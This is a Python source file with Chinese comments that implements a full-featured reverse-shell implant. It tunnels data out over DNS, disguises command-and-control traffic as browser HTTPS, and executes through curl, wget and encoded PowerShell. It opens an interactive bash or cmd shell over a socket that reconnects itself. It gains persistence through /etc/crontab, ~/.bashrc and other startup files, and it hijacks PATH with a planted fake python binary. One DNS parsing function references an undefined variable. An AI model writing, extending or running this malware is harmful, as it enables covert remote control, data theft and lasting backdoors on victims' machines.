import socket
import subprocess
import sys
import os
import json
import time
import base64
import random
import struct
import ssl
import shlex
import threading
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional, List

# --- DNS wire helpers (RFC 1035 minimal client) --------------------------------


def _dns_encode_name(fqdn: str) -> bytes:
    out = b""
    for part in fqdn.strip(".").split("."):
        p = part.encode("ascii", errors="replace")[:63]
        out += bytes([len(p)]) + p
    out += b"\x00"
    return out


def dns_build_query(fqdn: str, qtype: int = 16, qclass: int = 1) -> bytes:
    """Build a standard DNS query (recursion desired). qtype 16 = TXT."""
    tid = random.randint(1, 65535)
    flags = 0x0100
    header = struct.pack("!HHHHHH", tid, flags, 1, 0, 0, 0)
    return header + _dns_encode_name(fqdn) + struct.pack("!HH", qtype, qclass)


def _dns_skip_name(buf: bytes, off: int) -> int:
    while off < len(buf):
        ln = buf[off]
        if ln == 0:
            return off + 1
        if (ln & 0xC0) == 0xC0:
            return off + 2
        off += 1 + ln
    return off


def dns_parse_first_txt(buf: bytes) -> Optional[str]:
    """Extract concatenated strings from first TXT RR in a DNS response."""
    if len(buf) < 12:
        return None
    _, _, qdcount, ancount, _, _ = struct.unpack("!HHHHHH", buf[:12])
    off = 12
    for _ in range(qdcount):
        off = _dns_skip_name(buf, off)
        if off + 4 > len(buf):
            return None
        off += 4
    for _ in range(anscount):
        off = _dns_skip_name(buf, off)
        if off + 10 > len(buf):
            return None
        rtype, _rclass, _ttl, rdlen = struct.unpack("!HHIH", buf[off : off + 10])
        off += 10
        rdata = buf[off : off + rdlen]
        off += rdlen
        if rtype == 16 and rdata:
            parts: List[str] = []
            ro = 0
            while ro < len(rdata):
                sl = rdata[ro]
                parts.append(rdata[ro + 1 : ro + 1 + sl].decode("utf-8", errors="replace"))
                ro += 1 + sl
            return "".join(parts)
    return None


def payload_to_tunnel_fqnames(payload: bytes, base_domain: str) -> List[str]:
    """Encode bytes as hex labels under base_domain; may split into multiple FQDNs."""
    base = base_domain.strip(".")
    hexstr = payload.hex()
    step = 60
    chunks = [hexstr[i : i + step] for i in range(0, len(hexstr), step)] or ["00"]
    fqnames: List[str] = []
    current: List[str] = []
    budget = 240

    def flush() -> None:
        nonlocal current, budget
        if current:
            fqnames.append(".".join(current) + "." + base)
            current = []
            budget = 240

    for ch in chunks:
        need = len(ch) + (1 if current else 0)
        if current and need > budget:
            flush()
            current = [ch]
            budget = 240 - len(ch)
        else:
            current.append(ch)
            budget -= need
    flush()
    return fqnames


def schedule_interval_to_cron(interval_seconds: int) -> str:
    """Map interval to a simple cron expression (best-effort)."""
    if interval_seconds <= 0:
        return "*/5 * * * *"
    if interval_seconds < 60:
        return "* * * * *"
    if interval_seconds % 3600 == 0:
        h = max(1, interval_seconds // 3600)
        return f"0 */{h} * * *" if h > 1 else "0 * * * *"
    if interval_seconds % 60 == 0:
        m = max(1, min(59, interval_seconds // 60))
        return f"*/{m} * * * *"
    return "*/5 * * * *"


# ====================================
# 数据类定义
# ====================================

@dataclass
class DNSConfig:
    """DNS 隧道配置"""
    domain: str = "example.com"
    record_type: str = "TXT"  # TXT, CNAME, PTR
    timeout: int = 30
    resolver: str = "8.8.8.8"
    resolver_port: int = 53

@dataclass
class HTTPIsConfig:
    """HTTPS 伪装配置"""
    endpoint: str = "/inject"
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    method: str = "POST"
    use_tls: bool = True
    verify_ssl: bool = True

@dataclass
class LOTLConfig:
    """借壳配置"""
    tools: List[str] = field(default_factory=lambda: ["curl", "wget", "nc"])
    encoded_cmd: str = ""

@dataclass
class ScheduleConfig:
    """定时配置"""
    interval_seconds: int = 60
    enable: bool = True
    cron_schedule: str = "*/5 * * * *"
    crontab_mode: str = "system"  # "system" -> /etc/crontab; "user" -> crontab -

@dataclass
class PayloadConfig:
    """载荷配置"""
    load_modules: bool = False
    modify_paths: bool = False
    env_vars: dict = field(default_factory=dict)

# ====================================
# 增强版 ReverseShell 类
# ====================================

class EnhancedReverseShell:
    """增强版反向 Shell - 支持 DNS隧道、HTTPS伪装、LOTL、定时连接、供应链攻击"""
    
    def __init__(
        self,
        host: str = '127.0.0.1',
        port: int = 4444,
        timeout: int = 10,
        dns_config: Optional[DNSConfig] = None,
        https_config: Optional[HTTPIsConfig] = None,
        lotl_config: Optional[LOTLConfig] = None,
        schedule_config: Optional[ScheduleConfig] = None,
        payload_config: Optional[PayloadConfig] = None,
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket: Optional[socket.socket] = None
        
        # 配置对象
        self.dns_config = dns_config or DNSConfig()
        self.https_config = https_config or HTTPIsConfig()
        self.lotl_config = lotl_config or LOTLConfig()
        self.schedule_config = schedule_config or ScheduleConfig()
        self.payload_config = payload_config or PayloadConfig()
        
        # 连接状态
        self.connected = False
        self.last_command: Optional[str] = None
        
        # 日志
        self.connect_log: List[str] = []

    def c2_url(self) -> str:
        """C2 基 URL（尊重 HTTPIsConfig.endpoint 与 use_tls）。"""
        hc = self.https_config
        ep = hc.endpoint if hc.endpoint.startswith("/") else "/" + hc.endpoint
        scheme = "https" if hc.use_tls else "http"
        return f"{scheme}://{self.host}:{self.port}{ep}"

    # ====================================
    # DNS 隧道功能
    # ====================================
    
    def encode_to_dns(self, data: str) -> List[str]:
        """将数据编码为若干 FQNAME（十六进制标签 + 基域），供 wire 查询使用。"""
        raw = data.encode("utf-8", errors="ignore")
        return payload_to_tunnel_fqnames(raw, self.dns_config.domain)

    def query_dns(self) -> Optional[str]:
        """发送标准 DNS 查询并解析响应（TXT 时返回首条 TXT 拼接串）。"""
        try:
            fqdn = self.dns_config.domain.strip(".")
            qtype = 16 if self.dns_config.record_type.upper() == "TXT" else 1
            pkt = dns_build_query(fqdn, qtype=qtype)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.dns_config.timeout)
            s.sendto(pkt, (self.dns_config.resolver, self.dns_config.resolver_port))
            data, _ = s.recvfrom(4096)
            s.close()
            if self.dns_config.record_type.upper() == "TXT":
                txt = dns_parse_first_txt(data)
                return txt
            return data[: min(200, len(data))].hex()
        except Exception as e:
            print(f"[DNS] 查询错误: {e}")
            return None
    
    def send_dns_tunnel(self, data: str) -> bool:
        """通过 DNS wire 格式查询外带数据（与 dns_tunnel_server.py 实验室服务端配对时可观测）。"""
        try:
            fqnames = self.encode_to_dns(data)
            qtype = 16 if self.dns_config.record_type.upper() == "TXT" else 1
            for fqdn in fqnames:
                pkt = dns_build_query(fqdn.strip("."), qtype=qtype)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(self.dns_config.timeout)
                s.sendto(pkt, (self.dns_config.resolver, self.dns_config.resolver_port))
                s.close()
            print(f"[DNS] 已发送 {len(fqnames)} 条 wire 格式 DNS 查询 -> {self.dns_config.resolver}:{self.dns_config.resolver_port}")
            return True
        except Exception as e:
            print(f"[DNS] 发送隧道错误: {e}")
            return False

    # ====================================
    # HTTPS 伪装功能
    # ====================================
    
    def camouflage_https(self, data: str) -> Optional[str]:
        """使用 HTTPS（或 HTTP，由 use_tls 决定）传输 JSON，伪装浏览器请求。"""
        try:
            payload = json.dumps({
                "command": data,
                "timestamp": time.time(),
                "host_info": socket.gethostname(),
            })
            headers = {
                "Content-Type": "application/json",
                "User-Agent": self.https_config.user_agent,
                "Accept": "application/json",
            }
            url = self.c2_url()
            request = urllib.request.Request(
                url,
                data=payload.encode(),
                headers=headers,
                method=self.https_config.method,
            )
            ctx: Optional[ssl.SSLContext] = None
            if self.https_config.use_tls:
                ctx = ssl.create_default_context()
                if not self.https_config.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
            response = urllib.request.urlopen(request, timeout=self.timeout, context=ctx)
            return response.read().decode("utf-8")
        except urllib.error.URLError as e:
            print(f"[HTTPS] 请求错误: {e}")
            return None
        except Exception as e:
            print(f"[HTTPS] 错误: {e}")
            return None

    # ====================================
    # 借壳 (LOTL) 功能
    # ====================================
    
    def create_encoded_command(self, cmd: str) -> Optional[str]:
        """生成 PowerShell -EncodedCommand 用 Base64（UTF-16LE）。"""
        try:
            return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
        except Exception as e:
            print(f"[LOTL] 编码命令错误: {e}")
            return None
    
    def run_lotl_command(self, cmd: str) -> Optional[str]:
        """使用系统自带工具：curl/wget 向 C2 POST；Windows 上 PowerShell 用 -EncodedCommand 执行编码后的脚本片段。"""
        url = self.c2_url()
        body = json.dumps({"command": cmd})
        for tool in self.lotl_config.tools:
            try:
                t = tool.lower()
                if t in ("powershell", "pwsh"):
                    if t == "powershell" and sys.platform != "win32":
                        continue
                    exe = "powershell.exe" if t == "powershell" else "pwsh"
                    b64 = self.create_encoded_command(cmd)
                    if not b64:
                        continue
                    result = subprocess.run(
                        [exe, "-NoProfile", "-NonInteractive", "-EncodedCommand", b64],
                        capture_output=True,
                        text=True,
                        timeout=self.timeout,
                    )
                    if result.returncode == 0:
                        return result.stdout
                elif t == "curl":
                    curl_cmd: List[str] = [
                        "curl",
                        "-s",
                        "-X",
                        self.https_config.method,
                        "-H",
                        "Content-Type: application/json",
                        "--data-binary",
                        body,
                        url,
                    ]
                    if self.https_config.use_tls and not self.https_config.verify_ssl:
                        curl_cmd.insert(1, "-k")
                    result = subprocess.run(
                        curl_cmd,
                        capture_output=True,
                        text=True,
                        timeout=self.timeout,
                    )
                    if result.returncode == 0:
                        return result.stdout
                elif t == "wget":
                    wargs = [
                        "wget",
                        "-q",
                        "-O",
                        "-",
                        "--header",
                        "Content-Type: application/json",
                        "--post-data",
                        body,
                        url,
                    ]
                    if self.https_config.use_tls and not self.https_config.verify_ssl:
                        wargs.insert(1, "--no-check-certificate")
                    result = subprocess.run(
                        wargs,
                        capture_output=True,
                        text=True,
                        timeout=self.timeout,
                    )
                    if result.returncode == 0:
                        return result.stdout
                else:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=self.timeout,
                    )
                    if result.returncode == 0:
                        return result.stdout
            except Exception as e:
                print(f"[LOTL] 使用 {tool} 执行错误: {e}")
                continue
        return None

    # ====================================
    # 连接功能
    # ====================================
    
    def connect(self) -> bool:
        """建立到目标主机的连接"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.timeout)
            
            print(f"[连接] 正在连接到 {self.host}:{self.port}...")
            self.socket.connect((self.host, self.port))
            self.connected = True
            
            # 设置接收缓冲区
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)

            print(f"[连接] 连接到 {self.host}:{self.port} 成功！")
            
            # 记录连接信息
            connection_info = {
                "host": self.host,
                "port": self.port,
                "timestamp": datetime.now().isoformat(),
                "socket": str(self.socket)
            }
            
            self.connect_log.append(f"[连接] {connection_info}")
            
            return True
            
        except socket.timeout:
            print(f"[连接] 连接超时")
            return False
        except Exception as e:
            print(f"[连接] 连接错误: {e}")
            return False

    def receive_output(self) -> Optional[str]:
        """接收并显示输出"""
        try:
            if not self.socket:
                return None
            
            # 读取输出
            output = self.socket.recv(4096).decode('utf-8', errors='ignore')
            
            if output:
                self.last_command = f"Received output:\n{output}"
                print(output, end='')
                return output
            return None
            
        except Exception as e:
            print(f"[接收] 接收错误: {e}")
            return None

    def send_output(self, command: str) -> Optional[str]:
        """发送命令到服务器"""
        try:
            # 使用 JSON 格式发送
            command_data = json.dumps({
                "command": command,
                "timestamp": datetime.now().isoformat(),
                "client_ip": socket.gethostbyname(socket.gethostname())
            })
            
            self.socket.send(command_data.encode() + b"\n")
            self.last_command = f"Sent: {command_data}\n"
            
            return command_data
            
        except Exception as e:
            print(f"[发送] 发送命令错误: {e}")
            return None

    # ====================================
    # 定时任务（与 ScheduleConfig 统一）
    # ====================================

    def apply_schedule(self) -> bool:
        """按 schedule_config 写入 cron（system 写 /etc/crontab；user 用 crontab -）。"""
        sc = self.schedule_config
        if not sc.enable:
            print("[调度] 已禁用 (schedule_config.enable=False)")
            return True
        schedule = sc.cron_schedule or schedule_interval_to_cron(sc.interval_seconds)
        url = self.c2_url()
        payload = json.dumps({"command": ""})
        parts: List[str] = [
            "curl",
            "-s",
            "-X",
            self.https_config.method,
            "-H",
            "Content-Type: application/json",
            "-d",
            payload,
            url,
        ]
        if self.https_config.use_tls and not self.https_config.verify_ssl:
            parts.insert(1, "-k")
        cmd = shlex.join(parts)
        cron_line = f"{schedule} {cmd} >> /tmp/reverse_shell.log 2>&1\n"
        try:
            if sc.crontab_mode == "system":
                with open("/etc/crontab", "a") as f:
                    f.write(cron_line)
            else:
                existing = ""
                try:
                    r = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=15)
                    if r.returncode == 0:
                        existing = r.stdout
                except FileNotFoundError:
                    pass
                new_body = existing.rstrip() + "\n" + cron_line
                subprocess.run(["crontab", "-"], input=new_body, text=True, timeout=30, check=True)
            print(f"[调度] 已注册定时任务 mode={sc.crontab_mode!r} schedule={schedule!r}")
            return True
        except Exception as e:
            print(f"[调度] 设置定时连接错误: {e}")
            return False

    # ====================================
    # 持久化功能
    # ====================================
    
    def shell_session(self) -> None:
        """在已连接的 socket 上启动交互式 shell，用线程桥接 I/O（兼容 Windows）。
        断线后自动重连，Ctrl+C 退出。"""
        while True:
            if not self.connected:
                ok = self.connect()
                if not ok:
                    print("[会话] 重连失败，5秒后重试...")
                    time.sleep(5)
                    continue

            if sys.platform == "win32":
                shell_cmd = ["cmd.exe"]
            else:
                shell_cmd = ["/bin/bash", "-i"]

            stop_event = threading.Event()

            try:
                proc = subprocess.Popen(
                    shell_cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    bufsize=0,
                )
                self.socket.settimeout(None)
                print("[会话] Shell 已启动，进入交互模式")

                def socket_to_shell():
                    """socket 收到数据 -> 写入 shell stdin"""
                    try:
                        while not stop_event.is_set():
                            data = self.socket.recv(4096)
                            if not data:
                                break
                            proc.stdin.write(data)
                            proc.stdin.flush()
                    except OSError:
                        pass
                    finally:
                        stop_event.set()
                        proc.terminate()

                def shell_to_socket():
                    """shell stdout -> 发回 socket"""
                    try:
                        while not stop_event.is_set():
                            out = proc.stdout.read(4096)
                            if not out:
                                break
                            self.socket.sendall(out)
                    except OSError:
                        pass
                    finally:
                        stop_event.set()

                t1 = threading.Thread(target=socket_to_shell, daemon=True)
                t2 = threading.Thread(target=shell_to_socket, daemon=True)
                t1.start()
                t2.start()
                t1.join()
                t2.join()

            except KeyboardInterrupt:
                print("\n[会话] 用户中断，退出")
                stop_event.set()
                break
            except Exception as e:
                print(f"[会话] 错误: {e}")

            # 清理
            try:
                proc.terminate()
            except Exception:
                pass
            try:
                self.socket.close()
            except Exception:
                pass
            self.socket = None
            self.connected = False
            print("[会话] 5秒后重连...")
            time.sleep(5)

    def setup_persistence(self, method: str = "bashrc") -> bool:
        """设置持久化连接（URL 与当前实例 host/port/https 一致）。"""
        try:
            if method == "bashrc":
                bashrc_file = os.path.expanduser("~/.bashrc")
                if not os.path.exists(bashrc_file):
                    open(bashrc_file, "w").close()
                url = self.c2_url()
                curl_parts: List[str] = ["curl", "-s"]
                if self.https_config.use_tls and not self.https_config.verify_ssl:
                    curl_parts.append("-k")
                curl_parts += [
                    "-X",
                    self.https_config.method,
                    "-H",
                    "Content-Type: application/json",
                    "-d",
                    '{"command":"heartbeat"}',
                    url,
                ]
                curl_wrap = " ".join(shlex.quote(x) for x in curl_parts)
                with open(bashrc_file, "a") as f:
                    f.write(f"# Reverse Shell - Added at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"RS_C2_URL={shlex.quote(url)}\n")
                    f.write(f"RS_CURL={shlex.quote(curl_wrap)}\n")
                    f.write("if [ -n \"$RS_CURL\" ]; then\n")
                    f.write("    while true; do\n")
                    f.write("        eval \"$RS_CURL\"\n")
                    f.write("        sleep 60\n")
                    f.write("    done\n")
                    f.write("fi\n")
                print(f"[持久化] 已将连接命令添加到 {bashrc_file}")
                return True

            elif method == "crontab":
                return self.apply_schedule()

            else:
                print(f"[持久化] 持久化方法 '{method}' 未实现")
                return False
                
        except Exception as e:
            print(f"[持久化] 设置持久化错误: {e}")
            return False


ReverseShell = EnhancedReverseShell

# ====================================
# 模块级辅助
# ====================================

def supply_chain_attack_complete(shell: EnhancedReverseShell, attack_type: str = "path") -> bool:
    """供应链相关演示分支（与 shell.c2_url / DNS 配置对齐）。"""
    try:
        url = shell.c2_url()
        url_lit = json.dumps(url)
        if attack_type == "path":
            malicious_dir = "/tmp/reverse_shell"
            os.makedirs(malicious_dir, exist_ok=True)
            bin_dir = os.path.join(malicious_dir, "bin")
            os.makedirs(bin_dir, exist_ok=True)
            malicious_python = os.path.join(bin_dir, "python")
            with open(malicious_python, "w") as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("import json, sys, ssl, urllib.request\n")
                f.write(f"URL = {url_lit}\n")
                f.write("def main() -> None:\n")
                f.write("    raw = sys.stdin.read()\n")
                f.write("    if not raw.strip():\n")
                f.write("        return\n")
                f.write("    cmd = json.loads(raw)\n")
                f.write("    if 'command' not in cmd:\n")
                f.write("        return\n")
                f.write("    data = json.dumps({'command': cmd['command']}).encode()\n")
                f.write("    req = urllib.request.Request(URL, data=data, method='POST', headers={'Content-Type': 'application/json'})\n")
                f.write("    ctx = None\n")
                f.write("    if URL.startswith('https'):\n")
                f.write("        ctx = ssl.create_default_context()\n")
                if shell.https_config.use_tls and not shell.https_config.verify_ssl:
                    f.write("        ctx.check_hostname = False\n")
                    f.write("        ctx.verify_mode = ssl.CERT_NONE\n")
                f.write("    urllib.request.urlopen(req, context=ctx, timeout=30)\n")
                f.write("if __name__ == '__main__':\n")
                f.write("    main()\n")
            os.chmod(malicious_python, 0o755)
            hook = os.path.join(malicious_dir, "prepend_path.sh")
            with open(hook, "w") as f:
                f.write(f'export PATH="{bin_dir}:$PATH"\n')
            print(f"[供应链] 已写入 {malicious_python}；prepend PATH: source {shlex.quote(hook)}")
            return True

        elif attack_type == "env":
            os.environ["PYTHONPATH"] = "/tmp/reverse_shell/python"
            print(f"[供应链] 已设置 PYTHONPATH: {os.environ['PYTHONPATH']}")
            return True

        elif attack_type == "startup_script":
            startup_scripts = [
                "~/.bashrc",
                "~/.profile",
                "~/.zshrc",
                "/etc/profile",
                "/etc/bash.bashrc",
            ]
            curl_parts_sc = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", '{"command":"heartbeat"}', url]
            if shell.https_config.use_tls and not shell.https_config.verify_ssl:
                curl_parts_sc.insert(1, "-k")
            curl_line = " ".join(shlex.quote(x) for x in curl_parts_sc)
            for script in startup_scripts:
                script_path = os.path.expanduser(script)
                if not os.path.exists(script_path):
                    open(script_path, "w").close()
                with open(script_path, "a") as f:
                    f.write(f"# Reverse shell - Added at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write('if [ -z "$REVERSE_SHELL" ]; then\n')
                    f.write('    echo "Starting reverse shell..." >&2\n')
                    f.write("    while true; do\n")
                    f.write(f"        {curl_line}\n")
                    f.write("        sleep 3\n")
                    f.write("    done\n")
                    f.write("fi\n")
            print("[供应链] 已修改启动脚本（使用当前 shell 的 C2 URL）")
            return True

        elif attack_type == "dns":
            dns_script = "/tmp/reverse_shell_dns.py"
            with open(dns_script, "w") as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("# Lab: pair with dns_tunnel_server.py; client uses DNSConfig.resolver/port.\n")
                f.write(f"DNS_DOMAIN = {json.dumps(shell.dns_config.domain)}\n")
                f.write(f"RESOLVER = {json.dumps(shell.dns_config.resolver)}\n")
                f.write(f"PORT = {shell.dns_config.resolver_port}\n")
            os.chmod(dns_script, 0o755)
            print(f"[供应链] 已写入 {dns_script}（与 DNS 隧道客户端配置对齐）")
            return True

        else:
            print(f"[供应链] 供应链攻击类型 '{attack_type}' 未实现")
            return False

    except Exception as e:
        print(f"[供应链] 设置供应链攻击错误: {e}")
        return False


def scheduled_connection(shell: EnhancedReverseShell) -> bool:
    """兼容入口：委托给 EnhancedReverseShell.apply_schedule。"""
    return shell.apply_schedule()
